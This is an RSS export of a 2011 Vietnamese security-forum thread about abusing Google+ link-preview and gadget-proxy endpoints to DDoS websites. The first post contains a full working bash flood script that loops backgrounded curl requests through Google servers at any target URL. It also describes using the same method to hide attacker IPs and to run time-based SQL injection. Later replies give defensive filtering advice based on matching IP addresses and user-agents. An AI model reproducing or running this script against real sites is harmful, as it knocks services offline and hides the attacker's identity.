<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "Make Requests Through Google Servers DDos (IHteam)!"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/13.html</link>
		<description><![CDATA[Latest messages posted in the topic "Make Requests Through Google Servers DDos (IHteam)!"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>Make Requests Through Google Servers DDos (IHteam)!</title>
				<description><![CDATA[ <font color='red'>How does it work?</font>
The vulnerable pages are “/_/sharebox/linkpreview/“ and “gadgets/proxy?“
Is possible to request any file type, and G+ will download and show all the content. So, if you parallelize so many requests, is possible to DDoS any site with Google bandwidth. Is also possible to start the attack without be logged in G+.
<font color='red'>Attack vectors:</font>
The advantage of using Google and make requests through their servers, is to be even more anonymous when you attack some site (TOR+This method); The funny thing is that apache will log Google IPs.
But beware: gadgets/proxy? will send your ip in apache log, if you want to attack, you’ll need to use /_/sharebox/linkpreview/
Also the Sql injection Time attack will work using this method.
DDoS attack is just an example, do not start ddos for no reason
<font color='red'>Pratical examples:</font><span class="link"> https://plus.google.com/_/sharebox/linkpreview/?c=&lt;SITE&gt;&t=1&_reqid=&lt;RANDOM_NUMBERS&gt;&rt=j</span>
or<span class="link"> https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?url=&lt;SITE&gt;&container=focus</span>

code
<blockquote>#!/bin/bash
 
#   Bug found by                        #
#       Simone 'R00T_ATI' Quatrini      #
#       Mauro 'epicfail' Gasperini      #
#       Site:<span class="link"> http://www.ihteam.net</span>     #
 
function start {
    echo &quot;[*] Sending `echo $2` Requests...&quot;
 
    for a in `seq $2`
    do
        id=$((RANDOM%3999999+3000000))
        nohup curl &quot;https://plus.google.com/_/sharebox/linkpreview/?c=$url&t=1&_reqid=$id&rt=j&quot; -k -A &quot;Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0&quot; &gt; /dev/null 2&gt;&1 &
        nohup curl &quot;https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?url=$urlclear&container=focus&quot; -k -A &quot;Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0&quot; &gt; /dev/null 2&gt;&1 &
    done
 
    echo &quot;[*] Still attacking `echo $urlclear`&quot;
    echo &quot;[*] Sleeping for 10 Seconds&quot;
    sleep 10
    start url $2 urlclear
}
 
echo ''
echo '             88888888ba,    88888888ba,                  ad88888ba  ' 
echo '    aa      88      `&quot;8b   88      `&quot;8b                d8&quot;     &quot;8b  '
echo '    88      88        `8b  88        `8b               Y8,          '
echo 'aaaa88aaaa  88         88  88         88   ,adPPYba,   `Y8aaaaa,    '
echo '&quot;&quot;&quot;&quot;88&quot;&quot;&quot;&quot;  88         88  88         88  a8&quot;     &quot;8a    `&quot;&quot;&quot;&quot;&quot;8b,  '
echo '    88      88         8P  88         8P  8b       d8          `8b  '
echo '    &quot;&quot;      88      .a8P   88      .a8P   &quot;8a,   ,a8&quot;  Y8a     a8P  '
echo '            88888888Y&quot;&quot;    88888888Y&quot;&quot;     `&quot;YbbdP&quot;&quot;    &quot;Y88888P&quot;'
echo ''
 
if [ &quot;$#&quot; -lt 2 ]; then
    echo &quot;Usage: $0 &lt;big file&gt; &lt;Requests&gt;&quot;
    echo &quot;Example: $0<span class="link"> http://www.site.com/very_big_file.tar.gz</span> 1000&quot;
    echo &quot;&quot;
 
    exit 0                                                                                                                                                                          
fi                                                                                                                                                                                  
 
case $2 in                                                                                                                                                                          
    *[!0-9]* )  echo &quot;$2 is not numeric&quot; && exit 1;;                                                                                                                                
esac                                                                                                                                                                                
 
echo &quot;Attack --&gt;&quot; $1                                                                                                                                                                
match1=/                                                                                                                                                                            
repl1=%2F                                                                                                                                                                           
match2=:                                                                                                                                                                            
repl2=%3A                                                                                                                                                                           
url=$1                                                                                                                                                                              
urlclear=$1                                                                                                                                                                         
 
url=${url//$match1/$repl1}                                                                                                                                                          
url=${url//$match2/$repl2}                                                                                                                                                          
 
echo &quot;&quot;                                                                                                                                                                             
echo &quot;[*] Loop started! CTRL+C to stop&quot;                                                                                                                                             
echo &quot;&quot;
 
start url $2 urlclear
&nbsp;
		</blockquote>
Các bác có thông tin gì thêm về việc này không. từ ngày hva bị DDos đến vietnamnet cứ đi đâu nhìn thấy chữ này là mình sôi cả tiết, các anh STL có thấy thì bỏ qua nhé. Đừng thực hành làm gì :))]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/39969.html#246403</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/39969.html#246403</link>
				<pubDate><![CDATA[Thu, 1 Sep 2011 22:07:07]]> GMT</pubDate>
				<author><![CDATA[ ga_cum06]]></author>
			</item>
			<item>
				<title>Make Requests Through Google Servers DDos (IHteam)!</title>
				<description><![CDATA[ Xác nhận là còn 1 URL còn khả năng gây tác hại

<blockquote>https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?url=http://vnexpress.net/Files/Subject/3b/a2/e5/11/clinton2.jpg&container=focus&nbsp;
		</blockquote>

Google server sẽ get file trên về và hồi trả lại với đuôi *.txt]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/39969.html#246407</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/39969.html#246407</link>
				<pubDate><![CDATA[Thu, 1 Sep 2011 22:25:17]]> GMT</pubDate>
				<author><![CDATA[ xnohat]]></author>
			</item>
			<item>
				<title>Make Requests Through Google Servers DDos (IHteam)!</title>
				<description><![CDATA[ sáng nay em get thế này vẫn ổn áp
https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?url=http://www.hvaonline.net/hvaonline/posts/list/39969.html&container=focus]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/39969.html#246433</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/39969.html#246433</link>
				<pubDate><![CDATA[Fri, 2 Sep 2011 21:45:15]]> GMT</pubDate>
				<author><![CDATA[ ga_cum06]]></author>
			</item>
			<item>
				<title>Make Requests Through Google Servers DDos (IHteam)!</title>
				<description><![CDATA[ 12:18 13/09/2011 vẫn chưa khắc phục lỗi trên. vẫn get về file p.txt]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/39969.html#246993</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/39969.html#246993</link>
				<pubDate><![CDATA[Tue, 13 Sep 2011 00:19:36]]> GMT</pubDate>
				<author><![CDATA[ ga_cum06]]></author>
			</item>
			<item>
				<title>Make Requests Through Google Servers DDos (IHteam)!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">ga_cum06 wrote:</cite><br>
		<blockquote>12:18 13/09/2011 vẫn chưa khắc phục lỗi trên. vẫn get về file p.txt&nbsp;
		</blockquote>

Thật ra ddos ở dạng này khó tạo dung hại tối đa bởi vì chính google sẽ giới hạn số lượng lớn requests. Đây là một dạng sử dụng google như proxy và nếu tạo một cái script để gởi hàng loạt requests như vậy thì đến một lúc nào đó sẽ bị chặn. Tuy nhiên, gần đây thấy có nhiều bạn "thử nghiệm" quá cho nên fix luôn phía HVA cho yên  :P .]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/39969.html#247289</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/39969.html#247289</link>
				<pubDate><![CDATA[Sat, 17 Sep 2011 04:12:59]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Make Requests Through Google Servers DDos (IHteam)!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">ga_cum06 wrote:</cite><br>
		<blockquote>12:18 13/09/2011 vẫn chưa khắc phục lỗi trên. vẫn get về file p.txt&nbsp;
		</blockquote>

Thật ra ddos ở dạng này khó tạo dung hại tối đa bởi vì chính google sẽ giới hạn số lượng lớn requests. Đây là một dạng sử dụng google như proxy và nếu tạo một cái script để gởi hàng loạt requests như vậy thì đến một lúc nào đó sẽ bị chặn. Tuy nhiên, gần đây thấy có nhiều bạn "thử nghiệm" quá cho nên fix luôn phía HVA cho yên  :P .&nbsp;
		</blockquote>

Em đang tự hỏi liệu HVA đang lọc USER-AGENT và IP của google dể không cản trở google BOT lấy thông tin nên mới xảy ra hiện tượng này :-/. Như anh conmale nói thì liệu dùng proxy trước khi tạo truy vấn tới google thì có bị google hạn chế không :-/ (Em không hỏi về phía HVA). ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/39969.html#247467</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/39969.html#247467</link>
				<pubDate><![CDATA[Tue, 20 Sep 2011 12:18:58]]> GMT</pubDate>
				<author><![CDATA[ chiro8x]]></author>
			</item>
			<item>
				<title>Make Requests Through Google Servers DDos (IHteam)!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">chiro8x wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote><p></p>
		<cite class="blockquote">ga_cum06 wrote:</cite><br>
		<blockquote>12:18 13/09/2011 vẫn chưa khắc phục lỗi trên. vẫn get về file p.txt&nbsp;
		</blockquote>

Thật ra ddos ở dạng này khó tạo dung hại tối đa bởi vì chính google sẽ giới hạn số lượng lớn requests. Đây là một dạng sử dụng google như proxy và nếu tạo một cái script để gởi hàng loạt requests như vậy thì đến một lúc nào đó sẽ bị chặn. Tuy nhiên, gần đây thấy có nhiều bạn "thử nghiệm" quá cho nên fix luôn phía HVA cho yên  :P .&nbsp;
		</blockquote>

Em đang tự hỏi liệu HVA đang lọc USER-AGENT và IP của google dể không cản trở google BOT lấy thông tin nên mới xảy ra hiện tượng này :-/. Như anh conmale nói thì liệu dùng proxy trước khi tạo truy vấn tới google thì có bị google hạn chế không :-/ (Em không hỏi về phía HVA). &nbsp;
		</blockquote>

"Hiện tượng này" là hiện tượng nào?

Dùng bất cứ cái gì để truy vấn URL trên của google để gởi hàng loạt requests đến "nạn nhân" thì đến lúc nào đó google sẽ cản bởi vì google sẽ nhận ra sự bất thường. Tất nhiên nếu núp đằng sau hàng loạt anonymous proxies để thực hiện vụ này thì google sẽ detect sự bất thường chậm hơn. Chỉ có điều, lôi đâu ra hàng loạt anonymous proxies sống dai dẳng để làm chuyện này? Đó là chưa kể trường hợp truy cập qua anonymous proxy thường chậm như rùa và có đủ thứ phiền toái khác.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/39969.html#247472</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/39969.html#247472</link>
				<pubDate><![CDATA[Tue, 20 Sep 2011 18:36:15]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Make Requests Through Google Servers DDos (IHteam)!</title>
				<description><![CDATA[ Hiện tượng em đang nhắc đến là việc người ta sử dụng server của google. Vì em thấy thông tin trên HVA vẫn được google bot lấy thông tin đều đặn. Việc tìm các proxy để gửi truy vấn thì không khó vì em cũng từng làm rồi. Nếu viết một chương trình tạo nhều thread thì cho dù độ trể của các proxy cao nhưng vẫn có thể tạo nhều truy vấn tới. Vấn đề phát hiện bất thường thì google làm rất tốt. Cảm ơn anh đã trả lời !.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/39969.html#247538</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/39969.html#247538</link>
				<pubDate><![CDATA[Wed, 21 Sep 2011 07:39:31]]> GMT</pubDate>
				<author><![CDATA[ chiro8x]]></author>
			</item>
			<item>
				<title>Make Requests Through Google Servers DDos (IHteam)!</title>
				<description><![CDATA[ @chiro8x: có lẽ bạn chưa đọc kí bug này, đây là lỗi của server google plus chứ ko phải bot google :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/39969.html#247613</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/39969.html#247613</link>
				<pubDate><![CDATA[Thu, 22 Sep 2011 10:13:21]]> GMT</pubDate>
				<author><![CDATA[ ga_cum06]]></author>
			</item>
			<item>
				<title>Make Requests Through Google Servers DDos (IHteam)!</title>
				<description><![CDATA[ Thật ra nếu xét trên mặt nguyên tắc thì một chức năng nào đó của google có thể đóng vai như một proxy để lấy thông tin. Đây là chuyện bình thường. Hàng triệu proxy trên mạng cũng làm việc này.

Lỗi đáng nói ở đây là lỗi &quot;service bound checking&quot; chớ không phải là lỗi chức năng. Lẽ ra google phải kiểm soát xem request xuyên qua &quot;proxy&quot; kia được ai đó thực thi có phải đã đăng nhập vào account G+ hẳn hòi hay chưa hoặc nghiêm trọng hơn nữa, &quot;sharebox&quot; chấp nhận random number và thực thi mà không hề kiểm soát gì hết.

Chuyện đáng nói ở đây là chuyện gần như 99% webmasters tin tưởng &quot;google&quot; và cho phép các chuỗi IP + User-agent của google access hệ thống của mình (đây cũng là hậu quả của căn bệnh SEO  :-) ) cho nên mới dễ bị đập bằng phương pháp &quot;mượn tay&quot; google.

Trong vòng hai tuần qua, tớ nhận khá nhiều cầu cứu khắc phục tình trạng bị &quot;ddos&quot; kiểu này. Chứng tỏ các bạn &quot;kiddies&quot; lấy mấy cái script có sẵn để đi phá làng phá xóm khá nhiều. Nguyên tắc fix rất đơn giản:

1. Vẫn cho phép các chuỗi IP của google access và kiểm tra user-agent.
2. Nếu user-agent đúng là của google nhưng IP không thuộc google --&gt; trảm đẹp.
3. Nếu user-agent và IP đúng là của google, nhưng &quot;fetch&quot; mà lại không đụng gì tới một URI có rss (feed) thì ---&gt; trảm nốt.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/39969.html#247622</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/39969.html#247622</link>
				<pubDate><![CDATA[Thu, 22 Sep 2011 18:43:27]]> GMT</pubDate>
				<author><![CDATA[ conmale]]></author>
			</item>
			<item>
				<title>Make Requests Through Google Servers DDos (IHteam)!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">ga_cum06 wrote:</cite><br>
		<blockquote>@chiro8x: có lẽ bạn chưa đọc kí bug này, đây là lỗi của server google plus chứ ko phải bot google :D&nbsp;
		</blockquote>
Có lẽ bạn không hiểu ý mình ! mình đang nói là IP của google và User-Agent của google. Và thứ anh conmale nói là căn bệnh SEO. Mình sẽ rút kình nghiệm lần sau sẽ viết bài rõ hơn. ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/39969.html#247651</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/39969.html#247651</link>
				<pubDate><![CDATA[Fri, 23 Sep 2011 21:07:34]]> GMT</pubDate>
				<author><![CDATA[ chiro8x]]></author>
			</item>
			<item>
				<title>Make Requests Through Google Servers DDos (IHteam)!</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">conmale wrote:</cite><br>
		<blockquote><font color='red'>1. Vẫn cho phép các chuỗi IP của google access và kiểm tra user-agent.
2. Nếu user-agent đúng là của google nhưng IP không thuộc google --&gt; trảm đẹp.</font>
3. Nếu user-agent và IP đúng là của google, nhưng &quot;fetch&quot; mà lại không đụng gì tới một URI có rss (feed) thì ---&gt; trảm nốt.&nbsp;
		</blockquote>

Cảm ơn anh vì gợi ý, ở điều 1 và 2 có thể gộp chung lại thành 1 Rule [chain] trong Mod_Security
Còn điều 3 em sẽ tìm hiểu thêm.

Bạn nào cần xem tại đây:<span class="link"> http://www.hvaonline.net/hvaonline/readingRoom/item/237042.html</span>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/39969.html#247655</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/39969.html#247655</link>
				<pubDate><![CDATA[Fri, 23 Sep 2011 22:38:15]]> GMT</pubDate>
				<author><![CDATA[ mapthulu]]></author>
			</item>
	</channel>
</rss>
